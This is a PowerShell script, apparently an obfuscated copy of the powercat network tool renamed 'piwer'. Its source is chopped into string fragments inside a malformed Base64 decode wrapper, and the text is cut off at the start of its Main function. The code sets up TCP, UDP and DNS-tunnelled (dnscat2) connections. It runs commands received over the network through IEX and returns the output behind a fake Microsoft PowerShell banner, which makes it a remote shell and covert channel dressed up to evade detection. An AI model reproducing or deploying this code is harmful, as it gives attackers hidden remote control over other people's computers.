$e = [System.Convert]::FromBase64String('$fragments = @('function piwer
{','
  param(
    [a','lias("Client")][','string]$c="",
  ','  [alias("Listen','")][switch]$l=$F','alse,
    [alias','("Port")][Parame','ter(Position=-1)','][string]$p="",
','    [alias("Exec','ute")][string]$e','="",
    [alias(','"ExecutePowershe','ll")][switch]$ep','=$False,
    [al','ias("Relay")][st','ring]$r="",
    ','[alias("UDP")][s','witch]$u=$False,','
    [alias("dns','cat2")][string]$','dns="",
    [ali','as("DNSFailureTh','reshold")][int32',']$dnsft=10,
    ','[alias("Timeout"',')][int32]$t=60,
','    [Parameter(V','alueFromPipeline','=$True)][alias("','Input")]$i=$null',',
    [ValidateS','et(''Host'', ''Byte','s'', ''String'')][a','lias("OutputType','")][string]$o="H','ost",
    [alias','("OutputFile")][','string]$of="",
 ','   [alias("Disco','nnect")][switch]','$d=$False,
    [','alias("Repeater"',')][switch]$rep=$','False,
    [alia','s("GeneratePaylo','ad")][switch]$g=','$False,
    [ali','as("GenerateEnco','ded")][switch]$g','e=$False,
    [a','lias("Help")][sw','itch]$h=$False
 ',' )

  
  #######','######## VALIDAT','E ARGS #########','######
  $global',':Verbose = $Verb','ose
  if($of -ne',' ''''){$o = ''Bytes','''}
  if($dns -eq',' "")
  {
    if(','(($c -eq "") -an','d (!$l)) -or (($','c -ne "") -and $','l)){return "You ','must select eith','er client mode (','-c) or listen mo','de (-l)."}
    i','f($p -eq ""){ret','urn "Please prov','ide a port numbe','r to -p."}
  }
 ',' if(((($r -ne ""',') -and ($e -ne "','")) -or (($e -ne',' "") -and ($ep))',') -or  (($r -ne ','"") -and ($ep)))','{return "You can',' only pick one o','f these: -e, -ep',', -r"}
  if(($i ','-ne $null) -and ','(($r -ne "") -or',' ($e -ne ""))){r','eturn "-i is not',' applicable here','."}
  if($l)
  {','
    $Failure = ','$False
    netst','at -na | Select-','String LISTENING',' | % {if(($_.ToS','tring().split(":','")[1].split(" ")','[0]) -eq $p){Wri','te-Output ("The ','selected port " ','+ $p + " is alre','ady in use.") ; ','$Failure=$True}}','
    if($Failure','){break}
  }
  i','f($r -ne "")
  {','
    if($r.split','(":").Count -eq ','2)
    {
      $','Failure = $False','
      netstat -','na | Select-Stri','ng LISTENING | %',' {if(($_.ToStrin','g().split(":")[1','].split(" ")[0])',' -eq $r.split(":','")[1]){Write-Out','put ("The select','ed port " + $r.s','plit(":")[1] + "',' is already in u','se.") ; $Failure','=$True}}
      i','f($Failure){brea','k}
    }
  }
  #','############## V','ALIDATE ARGS ###','############
  
','  ##############','# UDP FUNCTIONS ','###############
','  function Setup','_UDP
  {
    par','am($FuncSetupVar','s)
    if($globa','l:Verbose){$Verb','ose = $True}
   ',' $c,$l,$p,$t = $','FuncSetupVars
  ','  $FuncVars = @{','}
    $FuncVars[','"Encoding"] = Ne','w-Object System.','Text.AsciiEncodi','ng
    if($l)
  ','  {
      $Socke','tDestinationBuff','er = New-Object ','System.Byte[] 65','536
      $EndPo','int = New-Object',' System.Net.IPEn','dPoint ([System.','Net.IPAddress]::','Any), $p
      $','FuncVars["Socket','"] = New-Object ','System.Net.Socke','ts.UDPClient $p
','      $PacketInf','o = New-Object S','ystem.Net.Socket','s.IPPacketInform','ation
      Writ','e-Verbose ("List','ening on [0.0.0.','0] port " + $p +',' " [udp]")
     ',' $ConnectHandle ','= $FuncVars["Soc','ket"].Client.Beg','inReceiveMessage','From($SocketDest','inationBuffer,0,','65536,[System.Ne','t.Sockets.Socket','Flags]::None,[re','f]$EndPoint,$nul','l,$null)
      $','Stopwatch = [Sys','tem.Diagnostics.','Stopwatch]::Star','tNew()
      whi','le($True)
      ','{
        if($Ho','st.UI.RawUI.KeyA','vailable)
      ','  {
          if','(@(17,27) -conta','ins ($Host.UI.Ra','wUI.ReadKey("NoE','cho,IncludeKeyDo','wn,IncludeKeyUp"',').VirtualKeyCode','))
          {
 ','           Write','-Verbose "CTRL o','r ESC caught. St','opping UDP Setup','..."
           ',' $FuncVars["Sock','et"].Close()
   ','         $Stopwa','tch.Stop()
     ','       break
   ','       }
       ',' }
        if($S','topwatch.Elapsed','.TotalSeconds -g','t $t)
        {
','          $FuncV','ars["Socket"].Cl','ose()
          ','$Stopwatch.Stop(',')
          Writ','e-Verbose "Timeo','ut!" ; break
   ','     }
        i','f($ConnectHandle','.IsCompleted)
  ','      {
        ','  $SocketBytesRe','ad = $FuncVars["','Socket"].Client.','EndReceiveMessag','eFrom($ConnectHa','ndle,[ref]([Syst','em.Net.Sockets.S','ocketFlags]::Non','e),[ref]$EndPoin','t,[ref]$PacketIn','fo)
          Wr','ite-Verbose ("Co','nnection from ["',' + $EndPoint.Add','ress.IPAddressTo','String + "] port',' " + $p + " [udp','] accepted (sour','ce port " + $End','Point.Port + ")"',')
          if($','SocketBytesRead ','-gt 0){break}
  ','        else{bre','ak}
        }
  ','    }
      $Sto','pwatch.Stop()
  ','    $FuncVars["I','nitialConnection','Bytes"] = $Socke','tDestinationBuff','er[0..([int]$Soc','ketBytesRead-1)]','
    }
    else
','    {
      if(!','$c.Contains(".")',')
      {
      ','  $IPList = @()
','        [System.','Net.Dns]::GetHos','tAddresses($c) |',' Where-Object {$','_.AddressFamily ','-eq "InterNetwor','k"} | %{$IPList ','+= $_.IPAddressT','oString}
       ',' Write-Verbose (','"Name " + $c + "',' resolved to add','ress " + $IPList','[0])
        $En','dPoint = New-Obj','ect System.Net.I','PEndPoint ([Syst','em.Net.IPAddress',']::Parse($IPList','[0])), $p
      ','}
      else
   ','   {
        $En','dPoint = New-Obj','ect System.Net.I','PEndPoint ([Syst','em.Net.IPAddress',']::Parse($c)), $','p
      }
      ','$FuncVars["Socke','t"] = New-Object',' System.Net.Sock','ets.UDPClient
  ','    $FuncVars["S','ocket"].Connect(','$c,$p)
      Wri','te-Verbose ("Sen','ding UDP traffic',' to " + $c + " p','ort " + $p + "..','.")
      Write-','Verbose ("UDP: M','ake sure to send',' some data so th','e server can not','ice you!")
    }','
    $FuncVars["','BufferSize"] = 6','5536
    $FuncVa','rs["EndPoint"] =',' $EndPoint
    $','FuncVars["Stream','DestinationBuffe','r"] = New-Object',' System.Byte[] $','FuncVars["Buffer','Size"]
    $Func','Vars["StreamRead','Operation"] = $F','uncVars["Socket"','].Client.BeginRe','ceiveFrom($FuncV','ars["StreamDesti','nationBuffer"],0',',$FuncVars["Buff','erSize"],([Syste','m.Net.Sockets.So','cketFlags]::None','),[ref]$FuncVars','["EndPoint"],$nu','ll,$null)
    re','turn $FuncVars
 ',' }
  function Re','adData_UDP
  {
 ','   param($FuncVa','rs)
    $Data = ','$null
    if($Fu','ncVars["StreamRe','adOperation"].Is','Completed)
    {','
      $StreamBy','tesRead = $FuncV','ars["Socket"].Cl','ient.EndReceiveF','rom($FuncVars["S','treamReadOperati','on"],[ref]$FuncV','ars["EndPoint"])','
      if($Strea','mBytesRead -eq 0','){break}
      $','Data = $FuncVars','["StreamDestinat','ionBuffer"][0..(','[int]$StreamByte','sRead-1)]
      ','$FuncVars["Strea','mReadOperation"]',' = $FuncVars["So','cket"].Client.Be','ginReceiveFrom($','FuncVars["Stream','DestinationBuffe','r"],0,$FuncVars[','"BufferSize"],([','System.Net.Socke','ts.SocketFlags]:',':None),[ref]$Fun','cVars["EndPoint"','],$null,$null)
 ','   }
    return ','$Data,$FuncVars
','  }
  function W','riteData_UDP
  {','
    param($Data',',$FuncVars)
    ','$FuncVars["Socke','t"].Client.SendT','o($Data,$FuncVar','s["EndPoint"]) |',' Out-Null
    re','turn $FuncVars
 ',' }
  function Cl','ose_UDP
  {
    ','param($FuncVars)','
    $FuncVars["','Socket"].Close()','
  }
  #########','###### UDP FUNCT','IONS ###########','####
  
  ######','######### DNS FU','NCTIONS ########','#######
  functi','on Setup_DNS
  {','
    param($Func','SetupVars)
    i','f($global:Verbos','e){$Verbose = $T','rue}
    functio','n ConvertTo-HexA','rray
    {
     ',' param($String)
','      $Hex = @()','
      $String.T','oCharArray() | %',' {"{0:x}" -f [by','te]$_} | % {if($','_.Length -eq 1){','"0" + [string]$_','} else{[string]$','_}} | % {$Hex +=',' $_}
      retur','n $Hex
    }
   ',' 
    function S','endPacket
    {
','      param($Pac','ket,$DNSServer,$','DNSPort)
      $','Command = ("set ','type=TXT`nserver',' $DNSServer`nset',' port=$DNSPort`n','set domain=.com`','nset retry=1`n" ','+ $Packet + "`ne','xit")
      $res','ult = ($Command ','| nslookup 2>&1 ','| Out-String)
  ','    if($result.C','ontains(''"'')){re','turn ([regex]::M','atch($result.rep','lace("bio=",""),','''(?<=")[^"]*(?="',')'').Value)}
    ','  else{return 1}','
    }
    
    ','function Create_','SYN
    {
      ','param($SessionId',',$SeqNum,$Tag,$D','omain)
      ret','urn ($Tag + ([st','ring](Get-Random',' -Maximum 9999 -','Minimum 1000)) +',' "00" + $Session','Id + $SeqNum + "','0000" + $Domain)','
    }
    
    ','function Create_','FIN
    {
      ','param($SessionId',',$Tag,$Domain)
 ','     return ($Ta','g + ([string](Ge','t-Random -Maximu','m 9999 -Minimum ','1000)) + "02" + ','$SessionId + "00','" + $Domain)
   ',' }
    
    func','tion Create_MSG
','    {
      para','m($SessionId,$Se','qNum,$Acknowledg','ementNumber,$Dat','a,$Tag,$Domain)
','      return ($T','ag + ([string](G','et-Random -Maxim','um 9999 -Minimum',' 1000)) + "01" +',' $SessionId + $S','eqNum + $Acknowl','edgementNumber +',' $Data + $Domain',')
    }
    
   ',' function Decode','Packet
    {
   ','   param($Packet',')
      
      i','f((($Packet.Leng','th)%2 -eq 1) -or',' ($Packet.Length',' -eq 0)){return ','1}
      $Acknow','ledgementNumber ','= ($Packet[10..1','3] -join "")
   ','   $SeqNum = ($P','acket[14..17] -j','oin "")
      [b','yte[]]$Returning','Data = @()
     ',' 
      if($Pack','et.Length -gt 18',')
      {
      ','  $PacketElim = ','$Packet.Substrin','g(18)
        wh','ile($PacketElim.','Length -gt 0)
  ','      {
        ','  $ReturningData',' += [byte[]][Con','vert]::ToInt16((','$PacketElim[0..1','] -join ""),16)
','          $Packe','tElim = $PacketE','lim.Substring(2)','
        }
     ',' }
      
      ','return $Packet,$','ReturningData,$A','cknowledgementNu','mber,$SeqNum
   ',' }
    
    func','tion Acknowledge','Data
    {
     ',' param($Returnin','gData,$Acknowled','gementNumber)
  ','    $Hex = [stri','ng]("{0:x}" -f (','([uint16]("0x" +',' $Acknowledgemen','tNumber) + $Retu','rningData.Length',') % 65535))
    ','  if($Hex.Length',' -ne 4){$Hex = (','("0"*(4-$Hex.Len','gth)) + $Hex)}
 ','     return $Hex','
    }
    $Func','Vars = @{}
    $','FuncVars["DNSSer','ver"],$FuncVars[','"DNSPort"],$Func','Vars["Domain"],$','FuncVars["Failur','eThreshold"] = $','FuncSetupVars
  ','  if($FuncVars["','DNSPort"] -eq ''''','){$FuncVars["DNS','Port"] = "53"}
 ','   $FuncVars["Ta','g"] = ""
    $Fu','ncVars["Domain"]',' = ("." + $FuncV','ars["Domain"])
 ','   
    $FuncVar','s["Create_SYN"] ','= ${function:Cre','ate_SYN}
    $Fu','ncVars["Create_M','SG"] = ${functio','n:Create_MSG}
  ','  $FuncVars["Cre','ate_FIN"] = ${fu','nction:Create_FI','N}
    $FuncVars','["DecodePacket"]',' = ${function:De','codePacket}
    ','$FuncVars["Conve','rtTo-HexArray"] ','= ${function:Con','vertTo-HexArray}','
    $FuncVars["','AckData"] = ${fu','nction:Acknowled','geData}
    $Fun','cVars["SendPacke','t"] = ${function',':SendPacket}
   ',' $FuncVars["Sess','ionId"] = ([stri','ng](Get-Random -','Maximum 9999 -Mi','nimum 1000))
   ',' $FuncVars["SeqN','um"] = ([string]','(Get-Random -Max','imum 9999 -Minim','um 1000))
    $F','uncVars["Encodin','g"] = New-Object',' System.Text.Asc','iiEncoding
    $','FuncVars["Failur','es"] = 0
    
  ','  $SYNPacket = (','Invoke-Command $','FuncVars["Create','_SYN"] -Argument','List @($FuncVars','["SessionId"],$F','uncVars["SeqNum"','],$FuncVars["Tag','"],$FuncVars["Do','main"]))
    $Re','sponsePacket = (','Invoke-Command $','FuncVars["SendPa','cket"] -Argument','List @($SYNPacke','t,$FuncVars["DNS','Server"],$FuncVa','rs["DNSPort"]))
','    $DecodedPack','et = (Invoke-Com','mand $FuncVars["','DecodePacket"] -','ArgumentList @($','ResponsePacket))','
    if($Decoded','Packet -eq 1){re','turn "Bad SYN re','sponse. Ensure y','our server is se','t up correctly."','}
    $Returning','Data = $DecodedP','acket[1]
    if(','$ReturningData -','ne ""){$FuncVars','["InputData"] = ','""}
    $FuncVar','s["AckNum"] = $D','ecodedPacket[2]
','    $FuncVars["M','axMSGDataSize"] ','= (244 - (Invoke','-Command $FuncVa','rs["Create_MSG"]',' -ArgumentList @','($FuncVars["Sess','ionId"],$FuncVar','s["SeqNum"],$Fun','cVars["AckNum"],','"",$FuncVars["Ta','g"],$FuncVars["D','omain"])).Length',')
    if($FuncVa','rs["MaxMSGDataSi','ze"] -le 0){retu','rn "Domain name ','is too long."}
 ','   return $FuncV','ars
  }
  functi','on ReadData_DNS
','  {
    param($F','uncVars)
    if(','$global:Verbose)','{$Verbose = $Tru','e}
    
    $Pac','ketsData = @()
 ','   $PacketData =',' ""
    
    if(','$FuncVars["Input','Data"] -ne $null',')
    {
      $H','ex = (Invoke-Com','mand $FuncVars["','ConvertTo-HexArr','ay"] -ArgumentLi','st @($FuncVars["','InputData"]))
  ','    $SectionCoun','t = 0
      $Pac','ketCount = 0
   ','   foreach($Char',' in $Hex)
      ','{
        if($Se','ctionCount -ge 3','0)
        {
   ','       $SectionC','ount = 0
       ','   $PacketData +','= "."
        }
','        if($Pack','etCount -ge ($Fu','ncVars["MaxMSGDa','taSize"]))
     ','   {
          $','PacketsData += $','PacketData.TrimE','nd(".")
        ','  $PacketCount =',' 0
          $Se','ctionCount = 0
 ','         $Packet','Data = ""
      ','  }
        $Pac','ketData += $Char','
        $Sectio','nCount += 2
    ','    $PacketCount',' += 2
      }
  ','    $PacketData ','= $PacketData.Tr','imEnd(".")
     ',' $PacketsData +=',' $PacketData
   ','   $FuncVars["In','putData"] = ""
 ','   }
    else
  ','  {
      $Packe','tsData = @("")
 ','   }
    
    [b','yte[]]$Returning','Data = @()
    f','oreach($PacketDa','ta in $PacketsDa','ta)
    {
      ','try{$MSGPacket =',' Invoke-Command ','$FuncVars["Creat','e_MSG"] -Argumen','tList @($FuncVar','s["SessionId"],$','FuncVars["SeqNum','"],$FuncVars["Ac','kNum"],$PacketDa','ta,$FuncVars["Ta','g"],$FuncVars["D','omain"])}
      ','catch{ Write-Ver','bose "DNSCAT2: F','ailed to create ','packet." ; $Func','Vars["Failures"]',' += 1 ; continue',' }
      try{$Pa','cket = (Invoke-C','ommand $FuncVars','["SendPacket"] -','ArgumentList @($','MSGPacket,$FuncV','ars["DNSServer"]',',$FuncVars["DNSP','ort"]))}
      c','atch{ Write-Verb','ose "DNSCAT2: Fa','iled to send pac','ket." ; $FuncVar','s["Failures"] +=',' 1 ; continue }
','      try
      ','{
        $Decod','edPacket = (Invo','ke-Command $Func','Vars["DecodePack','et"] -ArgumentLi','st @($Packet))
 ','       if($Decod','edPacket.Length ','-ne 4){ Write-Ve','rbose "DNSCAT2: ','Failure to decod','e packet, droppi','ng..."; $FuncVar','s["Failures"] +=',' 1 ; continue }
','        $FuncVar','s["AckNum"] = $D','ecodedPacket[2]
','        $FuncVar','s["SeqNum"] = $D','ecodedPacket[3]
','        $Returni','ngData += $Decod','edPacket[1]
    ','  }
      catch{',' Write-Verbose "','DNSCAT2: Failure',' to decode packe','t, dropping..." ','; $FuncVars["Fai','lures"] += 1 ; c','ontinue }
      ','if($DecodedPacke','t -eq 1){ Write-','Verbose "DNSCAT2',': Failure to dec','ode packet, drop','ping..." ; $Func','Vars["Failures"]',' += 1 ; continue',' }
    }
    
  ','  if($FuncVars["','Failures"] -ge $','FuncVars["Failur','eThreshold"]){br','eak}
    
    if','($ReturningData ','-ne @())
    {
 ','     $FuncVars["','AckNum"] = (Invo','ke-Command $Func','Vars["AckData"] ','-ArgumentList @(','$ReturningData,$','FuncVars["AckNum','"]))
    }
    r','eturn $Returning','Data,$FuncVars
 ',' }
  function Wr','iteData_DNS
  {
','    param($Data,','$FuncVars)
    $','FuncVars["InputD','ata"] = $FuncVar','s["Encoding"].Ge','tString($Data)
 ','   return $FuncV','ars
  }
  functi','on Close_DNS
  {','
    param($Func','Vars)
    $FINPa','cket = Invoke-Co','mmand $FuncVars[','"Create_FIN"] -A','rgumentList @($F','uncVars["Session','Id"],$FuncVars["','Tag"],$FuncVars[','"Domain"])
    I','nvoke-Command $F','uncVars["SendPac','ket"] -ArgumentL','ist @($FINPacket',',$FuncVars["DNSS','erver"],$FuncVar','s["DNSPort"]) | ','Out-Null
  }
  #','############## D','NS FUNCTIONS ###','############
  
','  ########## TCP',' FUNCTIONS #####','#####
  function',' Setup_TCP
  {
 ','   param($FuncSe','tupVars)
    $c,','$l,$p,$t = $Func','SetupVars
    if','($global:Verbose','){$Verbose = $Tr','ue}
    $FuncVar','s = @{}
    if(!','$l)
    {
      ','$FuncVars["l"] =',' $False
      $S','ocket = New-Obje','ct System.Net.So','ckets.TcpClient
','      Write-Verb','ose "Connecting.','.."
      $Handl','e = $Socket.Begi','nConnect($c,$p,$','null,$null)
    ','}
    else
    {','
      $FuncVars','["l"] = $True
  ','    Write-Verbos','e ("Listening on',' [0.0.0.0] (port',' " + $p + ")")
 ','     $Socket = N','ew-Object System','.Net.Sockets.Tcp','Listener $p
    ','  $Socket.Start(',')
      $Handle ','= $Socket.BeginA','cceptTcpClient($','null, $null)
   ',' }
    
    $Sto','pwatch = [System','.Diagnostics.Sto','pwatch]::StartNe','w()
    while($T','rue)
    {
     ',' if($Host.UI.Raw','UI.KeyAvailable)','
      {
       ',' if(@(17,27) -co','ntains ($Host.UI','.RawUI.ReadKey("','NoEcho,IncludeKe','yDown,IncludeKey','Up").VirtualKeyC','ode))
        {
','          Write-','Verbose "CTRL or',' ESC caught. Sto','pping TCP Setup.','.."
          if','($FuncVars["l"])','{$Socket.Stop()}','
          else{','$Socket.Close()}','
          $Stop','watch.Stop()
   ','       break
   ','     }
      }
 ','     if($Stopwat','ch.Elapsed.Total','Seconds -gt $t)
','      {
        ','if(!$l){$Socket.','Close()}
       ',' else{$Socket.St','op()}
        $S','topwatch.Stop()
','        Write-Ve','rbose "Timeout!"',' ; break
       ',' break
      }
 ','     if($Handle.','IsCompleted)
   ','   {
        if(','!$l)
        {
 ','         try
   ','       {
       ','     $Socket.End','Connect($Handle)','
            $St','ream = $Socket.G','etStream()
     ','       $BufferSi','ze = $Socket.Rec','eiveBufferSize
 ','           Write','-Verbose ("Conne','ction to " + $c ','+ ":" + $p + " [','tcp] succeeded!"',')
          }
  ','        catch{$S','ocket.Close(); $','Stopwatch.Stop()','; break}
       ',' }
        else
','        {
      ','    $Client = $S','ocket.EndAcceptT','cpClient($Handle',')
          $Str','eam = $Client.Ge','tStream()
      ','    $BufferSize ','= $Client.Receiv','eBufferSize
    ','      Write-Verb','ose ("Connection',' from [" + $Clie','nt.Client.Remote','EndPoint.Address','.IPAddressToStri','ng + "] port " +',' $port + " [tcp]',' accepted (sourc','e port " + $Clie','nt.Client.Remote','EndPoint.Port + ','")")
        }
 ','       break
   ','   }
    }
    $','Stopwatch.Stop()','
    if($Socket ','-eq $null){break','}
    $FuncVars[','"Stream"] = $Str','eam
    $FuncVar','s["Socket"] = $S','ocket
    $FuncV','ars["BufferSize"','] = $BufferSize
','    $FuncVars["S','treamDestination','Buffer"] = (New-','Object System.By','te[] $FuncVars["','BufferSize"])
  ','  $FuncVars["Str','eamReadOperation','"] = $FuncVars["','Stream"].BeginRe','ad($FuncVars["St','reamDestinationB','uffer"], 0, $Fun','cVars["BufferSiz','e"], $null, $nul','l)
    $FuncVars','["Encoding"] = N','ew-Object System','.Text.AsciiEncod','ing
    $FuncVar','s["StreamBytesRe','ad"] = 1
    ret','urn $FuncVars
  ','}
  function Rea','dData_TCP
  {
  ','  param($FuncVar','s)
    $Data = $','null
    if($Fun','cVars["StreamByt','esRead"] -eq 0){','break}
    if($F','uncVars["StreamR','eadOperation"].I','sCompleted)
    ','{
      $StreamB','ytesRead = $Func','Vars["Stream"].E','ndRead($FuncVars','["StreamReadOper','ation"])
      i','f($StreamBytesRe','ad -eq 0){break}','
      $Data = $','FuncVars["Stream','DestinationBuffe','r"][0..([int]$St','reamBytesRead-1)',']
      $FuncVar','s["StreamReadOpe','ration"] = $Func','Vars["Stream"].B','eginRead($FuncVa','rs["StreamDestin','ationBuffer"], 0',', $FuncVars["Buf','ferSize"], $null',', $null)
    }
 ','   return $Data,','$FuncVars
  }
  ','function WriteDa','ta_TCP
  {
    p','aram($Data,$Func','Vars)
    $FuncV','ars["Stream"].Wr','ite($Data, 0, $D','ata.Length)
    ','return $FuncVars','
  }
  function ','Close_TCP
  {
  ','  param($FuncVar','s)
    try{$Func','Vars["Stream"].C','lose()}
    catc','h{}
    if($Func','Vars["l"]){$Func','Vars["Socket"].S','top()}
    else{','$FuncVars["Socke','t"].Close()}
  }','
  ########## TC','P FUNCTIONS ####','######
  
  ####','###### CMD FUNCT','IONS ##########
','  function Setup','_CMD
  {
    par','am($FuncSetupVar','s)
    if($globa','l:Verbose){$Verb','ose = $True}
   ',' $FuncVars = @{}','
    $ProcessSta','rtInfo = New-Obj','ect System.Diagn','ostics.ProcessSt','artInfo
    $Pro','cessStartInfo.Fi','leName = $FuncSe','tupVars[0]
    $','ProcessStartInfo','.UseShellExecute',' = $False
    $P','rocessStartInfo.','RedirectStandard','Input = $True
  ','  $ProcessStartI','nfo.RedirectStan','dardOutput = $Tr','ue
    $ProcessS','tartInfo.Redirec','tStandardError =',' $True
    $Func','Vars["Process"] ','= [System.Diagno','stics.Process]::','Start($ProcessSt','artInfo)
    Wri','te-Verbose ("Sta','rting Process " ','+ $FuncSetupVars','[0] + "...")
   ',' $FuncVars["Proc','ess"].Start() | ','Out-Null
    $Fu','ncVars["StdOutDe','stinationBuffer"','] = New-Object S','ystem.Byte[] 655','36
    $FuncVars','["StdOutReadOper','ation"] = $FuncV','ars["Process"].S','tandardOutput.Ba','seStream.BeginRe','ad($FuncVars["St','dOutDestinationB','uffer"], 0, 6553','6, $null, $null)','
    $FuncVars["','StdErrDestinatio','nBuffer"] = New-','Object System.By','te[] 65536
    $','FuncVars["StdErr','ReadOperation"] ','= $FuncVars["Pro','cess"].StandardE','rror.BaseStream.','BeginRead($FuncV','ars["StdErrDesti','nationBuffer"], ','0, 65536, $null,',' $null)
    $Fun','cVars["Encoding"','] = New-Object S','ystem.Text.Ascii','Encoding
    ret','urn $FuncVars
  ','}
  function Rea','dData_CMD
  {
  ','  param($FuncVar','s)
    [byte[]]$','Data = @()
    i','f($FuncVars["Std','OutReadOperation','"].IsCompleted)
','    {
      $Std','OutBytesRead = $','FuncVars["Proces','s"].StandardOutp','ut.BaseStream.En','dRead($FuncVars[','"StdOutReadOpera','tion"])
      if','($StdOutBytesRea','d -eq 0){break}
','      $Data += $','FuncVars["StdOut','DestinationBuffe','r"][0..([int]$St','dOutBytesRead-1)',']
      $FuncVar','s["StdOutReadOpe','ration"] = $Func','Vars["Process"].','StandardOutput.B','aseStream.BeginR','ead($FuncVars["S','tdOutDestination','Buffer"], 0, 655','36, $null, $null',')
    }
    if($','FuncVars["StdErr','ReadOperation"].','IsCompleted)
   ',' {
      $StdErr','BytesRead = $Fun','cVars["Process"]','.StandardError.B','aseStream.EndRea','d($FuncVars["Std','ErrReadOperation','"])
      if($St','dErrBytesRead -e','q 0){break}
    ','  $Data += $Func','Vars["StdErrDest','inationBuffer"][','0..([int]$StdErr','BytesRead-1)]
  ','    $FuncVars["S','tdErrReadOperati','on"] = $FuncVars','["Process"].Stan','dardError.BaseSt','ream.BeginRead($','FuncVars["StdErr','DestinationBuffe','r"], 0, 65536, $','null, $null)
   ',' }
    return $D','ata,$FuncVars
  ','}
  function Wri','teData_CMD
  {
 ','   param($Data,$','FuncVars)
    $F','uncVars["Process','"].StandardInput','.WriteLine($Func','Vars["Encoding"]','.GetString($Data',').TrimEnd("`r").','TrimEnd("`n"))
 ','   return $FuncV','ars
  }
  functi','on Close_CMD
  {','
    param($Func','Vars)
    $FuncV','ars["Process"] |',' Stop-Process
  ','}  
  ##########',' CMD FUNCTIONS #','#########
  
  #','######### POWERS','HELL FUNCTIONS #','#########
  func','tion Main_Powers','hell
  {
    par','am($Stream1Setup','Vars)   
    try','
    {
      $en','coding = New-Obj','ect System.Text.','AsciiEncoding
  ','    [byte[]]$Inp','utToWrite = @()
','      if($i -ne ','$null)
      {
 ','       Write-Ver','bose "Input from',' -i detected..."','
        if(Test','-Path $i){ [byte','[]]$InputToWrite',' = ([io.file]::R','eadAllBytes($i))',' }
        elsei','f($i.GetType().N','ame -eq "Byte[]"','){ [byte[]]$Inpu','tToWrite = $i }
','        elseif($','i.GetType().Name',' -eq "String"){ ','[byte[]]$InputTo','Write = $Encodin','g.GetBytes($i) }','
        else{Wr','ite-Host "Unreco','gnised input typ','e." ; return}
  ','    }
    
     ',' Write-Verbose "','Setting up Strea','m 1... (ESC/CTRL',' to exit)"
     ',' try{$Stream1Var','s = Stream1_Setu','p $Stream1SetupV','ars}
      catch','{Write-Verbose "','Stream 1 Setup F','ailure" ; return','}
      
      W','rite-Verbose "Se','tting up Stream ','2... (ESC/CTRL t','o exit)"
      t','ry
      {
     ','   $IntroPrompt ','= $Encoding.GetB','ytes("Windows Po','werShell`nCopyri','ght (C) 2013 Mic','rosoft Corporati','on. All rights r','eserved.`n`n" + ','("PS " + (pwd).P','ath + "> "))
   ','     $Prompt = (','"PS " + (pwd).Pa','th + "> ")
     ','   $CommandToExe','cute = ""      
','        $Data = ','$null
      }
  ','    catch
      ','{
        Write-','Verbose "Stream ','2 Setup Failure"',' ; return
      ','}
      
      i','f($InputToWrite ','-ne @())
      {','
        Write-V','erbose "Writing ','input to Stream ','1..."
        tr','y{$Stream1Vars =',' Stream1_WriteDa','ta $InputToWrite',' $Stream1Vars}
 ','       catch{Wri','te-Host "Failed ','to write input t','o Stream 1" ; re','turn}
      }
  ','    
      if($d','){Write-Verbose ','"-d (disconnect)',' Activated. Disc','onnecting..." ; ','return}
      
 ','     Write-Verbo','se "Both Communi','cation Streams E','stablished. Redi','recting Data Bet','ween Streams..."','
      while($Tr','ue)
      {     ','   
        try
','        {
      ','    ##### Stream','2 Read #####
   ','       $Prompt =',' $null
         ',' $ReturnedData =',' $null
         ',' if($CommandToEx','ecute -ne "")
  ','        {
      ','      try{[byte[',']]$ReturnedData ','= $Encoding.GetB','ytes((IEX $Comma','ndToExecute 2>&1',' | Out-String))}','
            cat','ch{[byte[]]$Retu','rnedData = $Enco','ding.GetBytes(($','_ | Out-String))','}
            $P','rompt = $Encodin','g.GetBytes(("PS ','" + (pwd).Path +',' "> "))
        ','  }
          $D','ata += $IntroPro','mpt
          $I','ntroPrompt = $nu','ll
          $Da','ta += $ReturnedD','ata
          $D','ata += $Prompt
 ','         $Comman','dToExecute = ""
','          ##### ','Stream2 Read ###','##

          if','($Data -ne $null','){$Stream1Vars =',' Stream1_WriteDa','ta $Data $Stream','1Vars}
         ',' $Data = $null
 ','       }
       ',' catch
        {','
          Write','-Verbose "Failed',' to redirect dat','a from Stream 2 ','to Stream 1" ; r','eturn
        }
','        
       ',' try
        {
 ','         $Data,$','Stream1Vars = St','ream1_ReadData $','Stream1Vars
    ','      if($Data.L','ength -eq 0){Sta','rt-Sleep -Millis','econds 100}
    ','      if($Data -','ne $null){$Comma','ndToExecute = $E','ncoding.GetStrin','g($Data)}
      ','    $Data = $nul','l
        }
    ','    catch
      ','  {
          Wr','ite-Verbose "Fai','led to redirect ','data from Stream',' 1 to Stream 2" ','; return
       ',' }
      }
    }','
    finally
   ',' {
      try
   ','   {
        Wri','te-Verbose "Clos','ing Stream 1..."','
        Stream1','_Close $Stream1V','ars
      }
    ','  catch
      {
','        Write-Ve','rbose "Failed to',' close Stream 1"','
      }
    }
 ',' }
  ########## ','POWERSHELL FUNCT','IONS ##########
','
  ########## CO','NSOLE FUNCTIONS ','##########
  fun','ction Setup_Cons','ole
  {
    para','m($FuncSetupVars',')
    $FuncVars ','= @{}
    $FuncV','ars["Encoding"] ','= New-Object Sys','tem.Text.AsciiEn','coding
    $Func','Vars["Output"] =',' $FuncSetupVars[','0]
    $FuncVars','["OutputBytes"] ','= [byte[]]@()
  ','  $FuncVars["Out','putString"] = ""','
    return $Fun','cVars
  }
  func','tion ReadData_Co','nsole
  {
    pa','ram($FuncVars)
 ','   $Data = $null','
    if($Host.UI','.RawUI.KeyAvaila','ble)
    {
     ',' $Data = $FuncVa','rs["Encoding"].G','etBytes((Read-Ho','st) + "`n")
    ','}
    return $Da','ta,$FuncVars
  }','
  function Writ','eData_Console
  ','{
    param($Dat','a,$FuncVars)
   ',' switch($FuncVar','s["Output"])
   ',' {
      "Host" ','{Write-Host -n $','FuncVars["Encodi','ng"].GetString($','Data)}
      "St','ring" {$FuncVars','["OutputString"]',' += $FuncVars["E','ncoding"].GetStr','ing($Data)}
    ','  "Bytes" {$Func','Vars["OutputByte','s"] += $Data}
  ','  }
    return $','FuncVars
  }
  f','unction Close_Co','nsole
  {
    pa','ram($FuncVars)
 ','   if($FuncVars[','"OutputString"] ','-ne ""){return $','FuncVars["Output','String"]}
    el','seif($FuncVars["','OutputBytes"] -n','e @()){return $F','uncVars["OutputB','ytes"]}
    retu','rn
  }
  #######','### CONSOLE FUNC','TIONS ##########','
  
  ##########',' MAIN FUNCTION #','#########
  func','tion Main
  {
